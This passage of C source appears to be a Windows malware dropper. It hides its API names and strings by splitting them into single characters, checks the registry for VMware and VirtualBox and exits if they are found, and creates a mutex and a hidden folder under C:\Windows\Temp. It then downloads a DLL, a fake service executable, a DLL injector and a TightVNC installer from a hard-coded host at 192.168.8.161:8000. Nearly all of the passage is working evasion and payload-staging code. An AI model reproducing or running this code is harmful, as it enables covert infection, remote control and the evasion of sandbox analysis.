	FARPROC h_11_p_conn_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_conn_offset,ALL_ALPHANUM,sizeof(h_11_p_conn_offset)));	//WinHttpConnect
	FARPROC h_11_p_open_req_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_open_req_offset,ALL_ALPHANUM,sizeof(h_11_p_open_req_offset)));	//WinHttpOpenRequest
	FARPROC h_11_p_send_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_send_offset,ALL_ALPHANUM,sizeof(h_11_p_send_offset)));	//WinHttpSendRequest
	FARPROC h_11_p_recv_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_recv_offset,ALL_ALPHANUM,sizeof(h_11_p_recv_offset))); //WinHttpReceiveResponse
	FARPROC h_11_p_query_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_query_offset,ALL_ALPHANUM,sizeof(h_11_p_query_offset))); //WinHttpQueryDataAvailable
	FARPROC h_11_p_read_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_read_offset,ALL_ALPHANUM,sizeof(h_11_p_read_offset))); //WinHttpReadData
	FARPROC h_11_p_close_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_close_offset,ALL_ALPHANUM,sizeof(h_11_p_close_offset))); //WinHttpCloseHandle
	*/
	FARPROC n3t_op3n_func = GetProcAddress(hdll_inet,GetOriginal(n3t_op3n_offset,ALL_ALPHANUM,sizeof(n3t_op3n_offset))); //InternetOpenA
	FARPROC n3t_op3n_ur1_func = GetProcAddress(hdll_inet,GetOriginal(n3t_op3n_ur1_offset,ALL_ALPHANUM,sizeof(n3t_op3n_ur1_offset))); //InternetOpenUrlA
	FARPROC n3t_r3ad_f1l3_func = GetProcAddress(hdll_inet,GetOriginal(n3t_r3ad_f1l3_offset,ALL_ALPHANUM,sizeof(n3t_r3ad_f1l3_offset))); //InternetReadFile
	FARPROC n3t_cl0s3_hndl3_func = GetProcAddress(hdll_inet,GetOriginal(n3t_cl0s3_hndl3_offset,ALL_ALPHANUM,sizeof(n3t_cl0s3_hndl3_offset))); //InternetCloseHandle

	//FARPROC wr_dmp_func = GetProcAddress(hdll_d_b_g,GetOriginal(wr_dmp_offset,ALL_ALPHANUM,sizeof(wr_dmp_offset))); //MiniDumpWriteDump
	FARPROC open_SC_func = GetProcAddress(hdll_a_DV,GetOriginal(open_SC_offset,ALL_ALPHANUM,sizeof(open_SC_offset))); //OpenSCManagerA
	FARPROC open_service_func = GetProcAddress(hdll_a_DV,GetOriginal(open_service_offset,ALL_ALPHANUM,sizeof(open_service_offset)));	//OpenServicA
	FARPROC start_service_func = GetProcAddress(hdll_a_DV,GetOriginal(start_service_offset,ALL_ALPHANUM,sizeof(start_service_offset)));	//StartServiceA
	FARPROC close_service_func = GetProcAddress(hdll_a_DV,GetOriginal(close_service_offset,ALL_ALPHANUM,sizeof(close_service_offset)));	//CloseServiceHandle 
	
	//printf("[+] prototypes are ready...\n");
	// --- END FUNCTION PROTOTYPES INIT --- //
	
	
	
	
	// --- START ANTI-VM --- //
	// string splitting and function signatures to the function
	char full_string_key_1[100];	// SYSTEM\\CurrentControlSet\\Control\\SystemInformation
	char part_string_key_1_1[] = "S";
	char part_string_key_1_2[] = "Y";
	char part_string_key_1_3[] = "S";
	char part_string_key_1_4[] = "T";
	char part_string_key_1_5[] = "E";
	char part_string_key_1_6[] = "M";
	char part_string_key_1_7[] = "\\";
	char part_string_key_1_8[] = "C";
	char part_string_key_1_9[] = "u";
	char part_string_key_1_10[] = "r";
	char part_string_key_1_11[] = "r";
	char part_string_key_1_12[] = "e";
	char part_string_key_1_13[] = "n";
	char part_string_key_1_14[] = "t";
	char part_string_key_1_15[] = "C";
	char part_string_key_1_16[] = "o";
	char part_string_key_1_17[] = "n";
	char part_string_key_1_18[] = "t";
	char part_string_key_1_19[] = "r";
	char part_string_key_1_20[] = "o";
	char part_string_key_1_21[] = "l";
	char part_string_key_1_22[] = "S";
	char part_string_key_1_23[] = "e";
	char part_string_key_1_24[] = "t";
	char part_string_key_1_25[] = "\\C";
	char part_string_key_1_26[] = "o";
	char part_string_key_1_27[] = "n";
	char part_string_key_1_28[] = "t";
	char part_string_key_1_29[] = "r";
	char part_string_key_1_30[] = "o";
	char part_string_key_1_31[] = "l\\";
	char part_string_key_1_32[] = "S";
	char part_string_key_1_33[] = "y";
	char part_string_key_1_34[] = "s";
	char part_string_key_1_35[] = "t";
	char part_string_key_1_36[] = "e";
	char part_string_key_1_37[] = "m";
	char part_string_key_1_38[] = "I";
	char part_string_key_1_39[] = "n";
	char part_string_key_1_40[] = "f";
	char part_string_key_1_41[] = "o";
	char part_string_key_1_42[] = "r";
	char part_string_key_1_43[] = "m";
	char part_string_key_1_44[] = "a";
	char part_string_key_1_45[] = "t";
	char part_string_key_1_46[] = "i";
	char part_string_key_1_47[] = "o";
	char part_string_key_1_48[] = "n";
	strcpy(full_string_key_1, part_string_key_1_1);
	strcat(full_string_key_1, part_string_key_1_2);
	strcat(full_string_key_1, part_string_key_1_3);
	strcat(full_string_key_1, part_string_key_1_4);
	strcat(full_string_key_1, part_string_key_1_5);
	strcat(full_string_key_1, part_string_key_1_6);
	strcat(full_string_key_1, part_string_key_1_7);
	strcat(full_string_key_1, part_string_key_1_8);
	strcat(full_string_key_1, part_string_key_1_9);
	strcat(full_string_key_1, part_string_key_1_10);
	strcat(full_string_key_1, part_string_key_1_11);
	strcat(full_string_key_1, part_string_key_1_12);
	strcat(full_string_key_1, part_string_key_1_13);
	strcat(full_string_key_1, part_string_key_1_14);
	strcat(full_string_key_1, part_string_key_1_15);
	strcat(full_string_key_1, part_string_key_1_16);
	strcat(full_string_key_1, part_string_key_1_17);
	strcat(full_string_key_1, part_string_key_1_18);
	strcat(full_string_key_1, part_string_key_1_19);
	strcat(full_string_key_1, part_string_key_1_20);
	strcat(full_string_key_1, part_string_key_1_21);
	strcat(full_string_key_1, part_string_key_1_22);
	strcat(full_string_key_1, part_string_key_1_23);
	strcat(full_string_key_1, part_string_key_1_24);
	strcat(full_string_key_1, part_string_key_1_25);
	strcat(full_string_key_1, part_string_key_1_26);
	strcat(full_string_key_1, part_string_key_1_27);
	strcat(full_string_key_1, part_string_key_1_28);
	strcat(full_string_key_1, part_string_key_1_29);
	strcat(full_string_key_1, part_string_key_1_30);
	strcat(full_string_key_1, part_string_key_1_31);
	strcat(full_string_key_1, part_string_key_1_32);
	strcat(full_string_key_1, part_string_key_1_33);
	strcat(full_string_key_1, part_string_key_1_34);
	strcat(full_string_key_1, part_string_key_1_35);
	strcat(full_string_key_1, part_string_key_1_36);
	strcat(full_string_key_1, part_string_key_1_37);
	strcat(full_string_key_1, part_string_key_1_38);
	strcat(full_string_key_1, part_string_key_1_39);
	strcat(full_string_key_1, part_string_key_1_40);
	strcat(full_string_key_1, part_string_key_1_41);
	strcat(full_string_key_1, part_string_key_1_42);
	strcat(full_string_key_1, part_string_key_1_43);
	strcat(full_string_key_1, part_string_key_1_44);
	strcat(full_string_key_1, part_string_key_1_45);
	strcat(full_string_key_1, part_string_key_1_46);
	strcat(full_string_key_1, part_string_key_1_47);
	strcat(full_string_key_1, part_string_key_1_48);


	char full_string_key_2[100];	// SystemProductName
	char part_string_key_2_1[] = "S";
	char part_string_key_2_2[] = "y";
	char part_string_key_2_3[] = "s";
	char part_string_key_2_4[] = "t";
	char part_string_key_2_5[] = "e";
	char part_string_key_2_6[] = "m";
	char part_string_key_2_7[] = "P";
	char part_string_key_2_8[] = "r";
	char part_string_key_2_9[] = "o";
	char part_string_key_2_10[] = "d";
	char part_string_key_2_11[] = "u";
	char part_string_key_2_12[] = "c";
	char part_string_key_2_13[] = "t";
	char part_string_key_2_14[] = "N";
	char part_string_key_2_15[] = "a";
	char part_string_key_2_16[] = "m";
	char part_string_key_2_17[] = "e";
	strcpy(full_string_key_2, part_string_key_2_1);
	strcat(full_string_key_2, part_string_key_2_2);
	strcat(full_string_key_2, part_string_key_2_3);
	strcat(full_string_key_2, part_string_key_2_4);
	strcat(full_string_key_2, part_string_key_2_5);
	strcat(full_string_key_2, part_string_key_2_6);
	strcat(full_string_key_2, part_string_key_2_7);
	strcat(full_string_key_2, part_string_key_2_8);
	strcat(full_string_key_2, part_string_key_2_9);
	strcat(full_string_key_2, part_string_key_2_10);
	strcat(full_string_key_2, part_string_key_2_11);
	strcat(full_string_key_2, part_string_key_2_12);
	strcat(full_string_key_2, part_string_key_2_13);
	strcat(full_string_key_2, part_string_key_2_14);
	strcat(full_string_key_2, part_string_key_2_15);
	strcat(full_string_key_2, part_string_key_2_16);
	strcat(full_string_key_2, part_string_key_2_17);
	
	
	char full_string_key_3[100];	// VMware
	char part_string_key_3_1[] = "V";
	char part_string_key_3_2[] = "M";
	char part_string_key_3_3[] = "w";
	char part_string_key_3_4[] = "a";
	char part_string_key_3_5[] = "r";
	char part_string_key_3_6[] = "e";
	strcpy(full_string_key_3, part_string_key_3_1);
	strcat(full_string_key_3, part_string_key_3_2);
	strcat(full_string_key_3, part_string_key_3_3);
	strcat(full_string_key_3, part_string_key_3_4);
	strcat(full_string_key_3, part_string_key_3_5);
	strcat(full_string_key_3, part_string_key_3_6);

	char full_string_key_4[100];	// VirtualBox
	char part_string_key_4_1[] = "V";
	char part_string_key_4_2[] = "i";
	char part_string_key_4_3[] = "r";
	char part_string_key_4_4[] = "t";
	char part_string_key_4_5[] = "u";
	char part_string_key_4_6[] = "a";
	char part_string_key_4_7[] = "l";
	char part_string_key_4_8[] = "B";
	char part_string_key_4_9[] = "o";
	char part_string_key_4_10[] = "x";
	strcpy(full_string_key_4, part_string_key_4_1);
	strcat(full_string_key_4, part_string_key_4_2);
	strcat(full_string_key_4, part_string_key_4_3);
	strcat(full_string_key_4, part_string_key_4_4);
	strcat(full_string_key_4, part_string_key_4_5);
	strcat(full_string_key_4, part_string_key_4_6);
	strcat(full_string_key_4, part_string_key_4_7);
	strcat(full_string_key_4, part_string_key_4_8);
	strcat(full_string_key_4, part_string_key_4_9);
	strcat(full_string_key_4, part_string_key_4_10);


	char full_string_key_5[100];	// BiosVersion
	char part_string_key_5_1[] = "B";
	char part_string_key_5_2[] = "i";
	char part_string_key_5_3[] = "o";
	char part_string_key_5_4[] = "s";
	char part_string_key_5_5[] = "V";
	char part_string_key_5_6[] = "e";
	char part_string_key_5_7[] = "r";
	char part_string_key_5_8[] = "s";
	char part_string_key_5_9[] = "i";
	char part_string_key_5_10[] = "o";
	char part_string_key_5_11[] = "n";
	strcpy(full_string_key_5, part_string_key_5_1);
	strcat(full_string_key_5, part_string_key_5_2);
	strcat(full_string_key_5, part_string_key_5_3);
	strcat(full_string_key_5, part_string_key_5_4);
	strcat(full_string_key_5, part_string_key_5_5);
	strcat(full_string_key_5, part_string_key_5_6);
	strcat(full_string_key_5, part_string_key_5_7);
	strcat(full_string_key_5, part_string_key_5_8);
	strcat(full_string_key_5, part_string_key_5_9);
	strcat(full_string_key_5, part_string_key_5_10);
	strcat(full_string_key_5, part_string_key_5_11);
	
	
	char full_string_key_6[100];	// SystemManufacturer
	char part_string_key_6_1[] = "S";
	char part_string_key_6_2[] = "y";
	char part_string_key_6_3[] = "s";
	char part_string_key_6_4[] = "t";
	char part_string_key_6_5[] = "e";
	char part_string_key_6_6[] = "m";
	char part_string_key_6_7[] = "M";
	char part_string_key_6_8[] = "a";
	char part_string_key_6_9[] = "n";
	char part_string_key_6_10[] = "u";
	char part_string_key_6_11[] = "f";
	char part_string_key_6_12[] = "a";
	char part_string_key_6_13[] = "c";
	char part_string_key_6_14[] = "t";
	char part_string_key_6_15[] = "u";
	char part_string_key_6_16[] = "r";
	char part_string_key_6_17[] = "e";
	char part_string_key_6_18[] = "r";
	strcpy(full_string_key_6, part_string_key_6_1);
	strcat(full_string_key_6, part_string_key_6_2);
	strcat(full_string_key_6, part_string_key_6_3);
	strcat(full_string_key_6, part_string_key_6_4);
	strcat(full_string_key_6, part_string_key_6_5);
	strcat(full_string_key_6, part_string_key_6_6);
	strcat(full_string_key_6, part_string_key_6_7);
	strcat(full_string_key_6, part_string_key_6_8);
	strcat(full_string_key_6, part_string_key_6_9);
	strcat(full_string_key_6, part_string_key_6_10);
	strcat(full_string_key_6, part_string_key_6_11);
	strcat(full_string_key_6, part_string_key_6_12);
	strcat(full_string_key_6, part_string_key_6_13);
	strcat(full_string_key_6, part_string_key_6_14);
	strcat(full_string_key_6, part_string_key_6_15);
	strcat(full_string_key_6, part_string_key_6_16);
	strcat(full_string_key_6, part_string_key_6_17);
	strcat(full_string_key_6, part_string_key_6_18);

	
	if (Chk_VM_cmp(HKEY_LOCAL_MACHINE, full_string_key_1,
	full_string_key_2, full_string_key_4,open_key_reg_func,query_key_reg_func)) {
	//printf("VirtualBox VM registry key value detected :(\n");
	// CALL DEAD CODE TO EXECUTE
	//to show in main graph flow
	int x = 0;
	x += 1;
	x -= 1;
	x *= 2;
	x /= 2;

	// Additional complex math operations
	double y = 2.5;
	double z = 3.7;
	double result = 0.0;

	// Perform math operations
	result = sqrt(pow(y, 2) + pow(z, 2)); 
	result = sin(result);
	result = cos(result); 
	result = tan(result); 

	// Use the result to perform more operations
	for (int i = 0; i < 10; ++i) {
		result *= i;
		result /= (i + 1);
		result += i;
	}
	// Use the final result to perform some conditional operations
	if (result > 100) {
		result -= 124213;
	} 
	else {
		result += 2134;
	}
	
	exit(0);	//Debug
	
	}

	if (Chk_VM_cmp(HKEY_LOCAL_MACHINE, full_string_key_1,
	full_string_key_5, full_string_key_4,open_key_reg_func,query_key_reg_func)) {
	//printf("VirtualBox VM BIOS version detected :(\n");
	// CALL DEAD CODE TO EXECUTE
	//to show in main graph flow
	int x = 0;
	x += 1;
	x -= 1;
	x *= 2;
	x /= 2;

	// Additional complex math operations
	double y = 2.5;
	double z = 3.7;
	double result = 0.0;

	// Perform math operations
	result = sqrt(pow(y, 2) + pow(z, 2)); 
	result = sin(result);
	result = cos(result); 
	result = tan(result); 

	// Use the result to perform more operations
	for (int i = 0; i < 10; ++i) {
		result *= i;
		result /= (i + 1);
		result += i;
	}
	// Use the final result to perform some conditional operations
	if (result > 100) {
		result -= 124213;
	} 
	else {
		result += 2134;
	}
	
	exit(0);	//Debug
	}
	
	if (Chk_VM_substr(HKEY_LOCAL_MACHINE, full_string_key_1,
	full_string_key_6, full_string_key_3,open_key_reg_func,query_key_reg_func)) {
	//printf("VMware VM registry key value detected using substr from SystemManufacturer:(\n");
	// CALL DEAD CODE TO EXECUTE
	//to show in main graph flow
	int x = 0;
	x += 1;
	x -= 1;
	x *= 2;
	x /= 2;

	// Additional complex math operations
	double y = 2.5;
	double z = 3.7;
	double result = 0.0;

	// Perform math operations
	result = sqrt(pow(y, 2) + pow(z, 2)); 
	result = sin(result);
	result = cos(result); 
	result = tan(result); 

	// Use the result to perform more operations
	for (int i = 0; i < 10; ++i) {
		result *= i;
		result /= (i + 1);
		result += i;
	}
	// Use the final result to perform some conditional operations
	if (result > 100) {
		result -= 124213;
	} 
	else {
		result += 2134;
	}
	
	exit(0);	//Debug
	}
	
	if (Chk_VM_substr(HKEY_LOCAL_MACHINE, full_string_key_1,
	full_string_key_2, full_string_key_3,open_key_reg_func,query_key_reg_func)) {
	//printf("VMware VM registry key value detected using substr from SystemProductName:(\n");
	// CALL DEAD CODE TO EXECUTE
	//to show in main graph flow
	int x = 0;
	x += 1;
	x -= 1;
	x *= 2;
	x /= 2;

	// Additional complex math operations
	double y = 2.5;
	double z = 3.7;
	double result = 0.0;

	// Perform math operations
	result = sqrt(pow(y, 2) + pow(z, 2)); 
	result = sin(result);
	result = cos(result); 
	result = tan(result); 

	// Use the result to perform more operations
	for (int i = 0; i < 10; ++i) {
		result *= i;
		result /= (i + 1);
		result += i;
	}
	// Use the final result to perform some conditional operations
	if (result > 100) {
		result -= 124213;
	} 
	else {
		result += 2134;
	}
	
	exit(0);	//Debug
	}
	
	Chk_VM(NT_DelayExecution);
	// --- END ANTI-VM --- //
	
	
	// --- START CREATE MUTEX --- //
	HANDLE hMux = NULL;
	ObjectAttributes Object_Attr_mutant = {sizeof(Object_Attr),NULL};
	UNICODE_STRING MutantName;
	RtlInitUnicodeString(&MutantName, L"\\BaseNamedObjects\\win32_proc_mutant");
	Object_Attr_mutant.ObjectName = &MutantName;
	hMux=m_stuff(NT_OpenMutant,NT_CreateMutant,hMux,&Object_Attr_mutant);
	// --- END CREATE MUTEX --- //


	
	// --- START FILE/NET OPS --- //
	char full_string_1[55];  //	C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa
	char part_1_1[] = "C";
	char part_1_2[] = ":";
	char part_1_3[] = "\\";
	char part_1_4[] = "Wi";
	char part_1_5[] = "nd";
	char part_1_6[] = "ow";
	char part_1_7[] = "s\\";
	char part_1_8[] = "T";
	char part_1_9[] = "e";
	char part_1_10[] = "mp\\";
	char part_1_11[] = "SSS";
	char part_1_12[] = "_";
	char part_1_13[] = "ce";
	char part_1_14[] = "1";
	char part_1_15[] = "aaa";
	char part_1_16[] = "99ce";
	char part_1_17[] = "4bdb";
	char part_1_18[] = "0101";
	char part_1_19[] = "000000";
	char part_1_20[] = "984b2414";
	char part_1_21[] = "aa";
	strcpy(full_string_1, part_1_1);
	strcat(full_string_1, part_1_2);
	strcat(full_string_1, part_1_3);
	strcat(full_string_1, part_1_4);
	strcat(full_string_1, part_1_5);
	strcat(full_string_1, part_1_6);
	strcat(full_string_1, part_1_7);
	strcat(full_string_1, part_1_8);
	strcat(full_string_1, part_1_9);
	strcat(full_string_1, part_1_10);
	strcat(full_string_1, part_1_11);
	strcat(full_string_1, part_1_12);
	strcat(full_string_1, part_1_13);
	strcat(full_string_1, part_1_14);
	strcat(full_string_1, part_1_15);
	strcat(full_string_1, part_1_16);
	strcat(full_string_1, part_1_17);
	strcat(full_string_1, part_1_18);
	strcat(full_string_1, part_1_19);
	strcat(full_string_1, part_1_20);
	strcat(full_string_1, part_1_21);
	
	//printf("%s\n",full_string_1);
	
	char full_string_n3t[100];  //http://192.168.8.161:8000
	char part_n3t_1[] = "h";
	char part_n3t_2[] = "t";
	char part_n3t_3[] = "tp";
	char part_n3t_4[] = ":";
	char part_n3t_5[] = "//";
	char part_n3t_6[] = "1";
	char part_n3t_7[] = "9";
	char part_n3t_8[] = "2";
	char part_n3t_9[] = ".1";
	char part_n3t_10[] = "6";
	char part_n3t_11[] = "8.";
	char part_n3t_12[] = "8";
	char part_n3t_13[] = ".1";
	char part_n3t_14[] = "6";
	char part_n3t_15[] = "1:";
	char part_n3t_16[] = "8";
	char part_n3t_17[] = "000";
	char part_n3t_18[] = "/";
	strcpy(full_string_n3t, part_n3t_1);
	strcat(full_string_n3t, part_n3t_2);
	strcat(full_string_n3t, part_n3t_3);
	strcat(full_string_n3t, part_n3t_4);
	strcat(full_string_n3t, part_n3t_5);
	strcat(full_string_n3t, part_n3t_6);
	strcat(full_string_n3t, part_n3t_7);
	strcat(full_string_n3t, part_n3t_8);
	strcat(full_string_n3t, part_n3t_9);
	strcat(full_string_n3t, part_n3t_10);
	strcat(full_string_n3t, part_n3t_11);
	strcat(full_string_n3t, part_n3t_12);
	strcat(full_string_n3t, part_n3t_13);
	strcat(full_string_n3t, part_n3t_14);
	strcat(full_string_n3t, part_n3t_15);
	strcat(full_string_n3t, part_n3t_16);
	strcat(full_string_n3t, part_n3t_17);
	strcat(full_string_n3t, part_n3t_18);

	

	
	
	if (cr_dir_func(full_string_1,NULL) == 0){
		if (GetLastError() == 183){
			//printf("Folder Already exists.. continuing\n");
			
		}
		else{
			//printf("Failed to create folder. Error code: %lu\n", GetLastError());
			return 1;		
		}

	}
	//printf("[+] Created Directory\n");
	
	
	//printf("[+] Hiding the folder\n");
	//FILE_ATTRIBUTE_DIRECTORY -> 0x10
	//FILE_ATTRIBUTE_HIDDEN -> 0x2
	if (set_file_attr_func(full_string_1, 0x10 | 0x2)) {
		//printf("Folder is now hidden.\n");
	} 
	else{
		//printf("Failed to set folder as hidden. Error code: %lu\n", GetLastError());
		return 1;
	}
	

	
	
	char full_string_5[10];	// "legit.dll"
	char part_5_1[] = "";
	char part_5_2[] = "l";
	char part_5_3[] = "e";
	char part_5_4[] = "g";
	char part_5_5[] = "i";
	char part_5_6[] = "t";
	char part_5_7[] = ".";
	char part_5_8[] = "d";
	char part_5_9[] = "l";
	char part_5_10[] = "l";
	strcpy(full_string_5, part_5_1);
	strcat(full_string_5, part_5_2);
	strcat(full_string_5, part_5_3);
	strcat(full_string_5, part_5_4);
	strcat(full_string_5, part_5_5);
	strcat(full_string_5, part_5_6);
	strcat(full_string_5, part_5_7);
	strcat(full_string_5, part_5_8);
	strcat(full_string_5, part_5_9);
	strcat(full_string_5, part_5_10);
	
	
	
	char full_string_6[10];	// "\legit.dll"
	char part_6_1[] = "\\";
	char part_6_2[] = "l";
	char part_6_3[] = "e";
	char part_6_4[] = "g";
	char part_6_5[] = "i";
	char part_6_6[] = "t";
	char part_6_7[] = ".";
	char part_6_8[] = "d";
	char part_6_9[] = "l";
	char part_6_10[] = "l";
	
	char full_string_7[55+10];	//	"C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\legit.dll"
	strcpy(full_string_7,full_string_1);
	strcpy(full_string_6, part_6_1);
	strcat(full_string_6, part_6_2);
	strcat(full_string_6, part_6_3);
	strcat(full_string_6, part_6_4);
	strcat(full_string_6, part_6_5);
	strcat(full_string_6, part_6_6);
	strcat(full_string_6, part_6_7);
	strcat(full_string_6, part_6_8);
	strcat(full_string_6, part_6_9);
	strcat(full_string_6, part_6_10);
	strcat(full_string_7, full_string_6);
	//printf("sizeof(full_string_7) -> %d\n",sizeof(full_string_7));
	//printf("sizeof(\"legit.dll\") -> %d\n",sizeof("legit.dll"));
	//printf("%s\n",full_string_7);
	//wprintf(L"%s\n",file_path_1);

	char full_string_n3t_1[110]; //http://192.168.8.161:8000/legit.dll
	strcpy(full_string_n3t_1,full_string_n3t);
	strcat(full_string_n3t_1,full_string_5);

	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_1);
	dw_ff1e1(full_string_n3t_1, full_string_7,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);

	
	char full_string_8[20];	// "win_service32.exe"
	char part_8_1[] = "";
	char part_8_2[] = "w";
	char part_8_3[] = "in";
	char part_8_4[] = "_se";
	char part_8_5[] = "rv";
	char part_8_6[] = "ice3";
	char part_8_7[] = "2.";
	char part_8_8[] = "e";
	char part_8_9[] = "x";
	char part_8_10[] = "e";
	strcpy(full_string_8, part_8_1);
	strcat(full_string_8, part_8_2);
	strcat(full_string_8, part_8_3);
	strcat(full_string_8, part_8_4);
	strcat(full_string_8, part_8_5);
	strcat(full_string_8, part_8_6);
	strcat(full_string_8, part_8_7);
	strcat(full_string_8, part_8_8);
	strcat(full_string_8, part_8_9);
	strcat(full_string_8, part_8_10);
	
	
	
	char full_string_9[20];	// "\win_service32.exe"
	char part_9_1[] = "\\";
	char part_9_2[] = "w";
	char part_9_3[] = "in";
	char part_9_4[] = "_se";
	char part_9_5[] = "rv";
	char part_9_6[] = "ice3";
	char part_9_7[] = "2.";
	char part_9_8[] = "e";
	char part_9_9[] = "x";
	char part_9_10[] = "e";
	//printf("%s\n",full_string_9);
	
	char full_string_10[55+10];	//	"C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\win_service32.exe"
	strcpy(full_string_10,full_string_1);
	
	strcpy(full_string_9, part_9_1);
	strcat(full_string_9, part_9_2);
	strcat(full_string_9, part_9_3);
	strcat(full_string_9, part_9_4);
	strcat(full_string_9, part_9_5);
	strcat(full_string_9, part_9_6);
	strcat(full_string_9, part_9_7);
	strcat(full_string_9, part_9_8);
	strcat(full_string_9, part_9_9);
	strcat(full_string_9, part_9_10);
	strcat(full_string_10, full_string_9);
	//printf("sizeof(full_string_9) -> %d\n",sizeof(full_string_9));
	//printf("sizeof(\"\\win_service32.exe\") -> %d\n",sizeof("\\win_service32.exe"));
	//printf("%s\n",full_string_10);
	

	char full_string_n3t_2[110]; //http://192.168.8.161:8000/win_service32.exe
	strcpy(full_string_n3t_2,full_string_n3t);
	strcat(full_string_n3t_2,full_string_8);
	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_2);
	dw_ff1e1(full_string_n3t_2,full_string_10,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);

	char full_string_11[20];	// "dll_injector.exe"
	char part_11_1[] = "";
	char part_11_2[] = "d";
	char part_11_3[] = "ll";
	char part_11_4[] = "_in";
	char part_11_5[] = "jec";
	char part_11_6[] = "to";
	char part_11_7[] = "r.";
	char part_11_8[] = "e";
	char part_11_9[] = "x";
	char part_11_10[] = "e";
	strcpy(full_string_11, part_11_1);
	strcat(full_string_11, part_11_2);
	strcat(full_string_11, part_11_3);
	strcat(full_string_11, part_11_4);
	strcat(full_string_11, part_11_5);
	strcat(full_string_11, part_11_6);
	strcat(full_string_11, part_11_7);
	strcat(full_string_11, part_11_8);
	strcat(full_string_11, part_11_9);
	strcat(full_string_11, part_11_10);
	
	
	//printf("size of /dll_injector.exe -> %d\n",sizeof("\\dll_injector.exe"));
	char full_string_12[18];	// "\dll_injector.exe"
	char part_12_1[] = "\\";
	char part_12_2[] = "d";
	char part_12_3[] = "ll";
	char part_12_4[] = "_in";
	char part_12_5[] = "jec";
	char part_12_6[] = "to";
	char part_12_7[] = "r.";
	char part_12_8[] = "e";
	char part_12_9[] = "x";
	char part_12_10[] = "e";
	//printf("%s\n",full_string_12);

	
	char full_string_13[55+18];	//	"C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\dll_injector.exe"
	strcpy(full_string_13,full_string_1);
	
	strcpy(full_string_12, part_12_1);
	strcat(full_string_12, part_12_2);
	strcat(full_string_12, part_12_3);
	strcat(full_string_12, part_12_4);
	strcat(full_string_12, part_12_5);
	strcat(full_string_12, part_12_6);
	strcat(full_string_12, part_12_7);
	strcat(full_string_12, part_12_8);
	strcat(full_string_12, part_12_9);
	strcat(full_string_12, part_12_10);
	strcat(full_string_13, full_string_12);
	//printf("sizeof(full_string_12) -> %d\n",sizeof(full_string_12));
	//printf("sizeof(\"\\dll_injector.exe\") -> %d\n",sizeof("\\dll_injector.exe"));
	//printf("%s\n",full_string_13);
	
	
	
	
	char full_string_n3t_3[110]; //http://192.168.8.161:8000/dll_injector.exe
	strcpy(full_string_n3t_3,full_string_n3t);
	strcat(full_string_n3t_3,full_string_11);
	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_3);
	dw_ff1e1(full_string_n3t_3, full_string_13,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
	
	
	/*
	wchar_t full_string_14[20/2];	// L"/tightVNC.msi"
	wchar_t part_14_1[] = L"/";
	wchar_t part_14_2[] = L"t";
	wchar_t part_14_3[] = L"i";
	wchar_t part_14_4[] = L"gh";
	wchar_t part_14_5[] = L"tV";
	wchar_t part_14_6[] = L"N";
	wchar_t part_14_7[] = L"C";
	wchar_t part_14_8[] = L".";
	wchar_t part_14_9[] = L"m";
	wchar_t part_14_10[] = L"s";
	wchar_t part_14_11[] = L"i";
	//printf("size of /tightVNC.msi -> %d\n",sizeof(L"/tightVNC"));
	wcscpy(full_string_14, part_14_1);
	wcscat(full_string_14, part_14_2);
	wcscat(full_string_14, part_14_3);
	wcscat(full_string_14, part_14_4);
	wcscat(full_string_14, part_14_5);
	wcscat(full_string_14, part_14_6);
	wcscat(full_string_14, part_14_7);
	wcscat(full_string_14, part_14_8);
	wcscat(full_string_14, part_14_9);
	wcscat(full_string_14, part_14_10);
	wcscat(full_string_14, part_14_11);
	//printf("size of /tightVNC.msi after concat-> %d\n",sizeof(full_string_14));
	//wprintf(L"%s\n",full_string_14);
	*/
	
	
	char full_string_14[15];	// "\tightVNC.msi"
	char part_14_1[] = "";
	char part_14_2[] = "t";
	char part_14_3[] = "ig";
	char part_14_4[] = "htV";
	char part_14_5[] = "N";
	char part_14_6[] = "C";
	char part_14_7[] = ".";
	char part_14_8[] = "m";
	char part_14_9[] = "s";
	char part_14_10[] = "i";
	strcpy(full_string_14, part_14_1);
	strcat(full_string_14, part_14_2);
	strcat(full_string_14, part_14_3);
	strcat(full_string_14, part_14_4);
	strcat(full_string_14, part_14_5);
	strcat(full_string_14, part_14_6);
	strcat(full_string_14, part_14_7);
	strcat(full_string_14, part_14_8);
	strcat(full_string_14, part_14_9);
	strcat(full_string_14, part_14_10);
	
	
	
	
	//printf("size of \\tightVNC.msi -> %d\n",sizeof("\\tightVNC.msi"));
	char full_string_15[14];	// "\tightVNC.msi"
	char part_15_1[] = "\\";
	char part_15_2[] = "t";
	char part_15_3[] = "ig";
	char part_15_4[] = "htV";
	char part_15_5[] = "N";
	char part_15_6[] = "C";
	char part_15_7[] = ".";
	char part_15_8[] = "m";
	char part_15_9[] = "s";
	char part_15_10[] = "i";
	//printf("%s\n",full_string_15);
	
	char full_string_16[55+14];	//	"C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\tightVNC.msi"
	strcpy(full_string_16,full_string_1);
	
	strcpy(full_string_15, part_15_1);
	strcat(full_string_15, part_15_2);
	strcat(full_string_15, part_15_3);
	strcat(full_string_15, part_15_4);
	strcat(full_string_15, part_15_5);
	strcat(full_string_15, part_15_6);
	strcat(full_string_15, part_15_7);
	strcat(full_string_15, part_15_8);
	strcat(full_string_15, part_15_9);
	strcat(full_string_15, part_15_10);
	strcat(full_string_16, full_string_15);
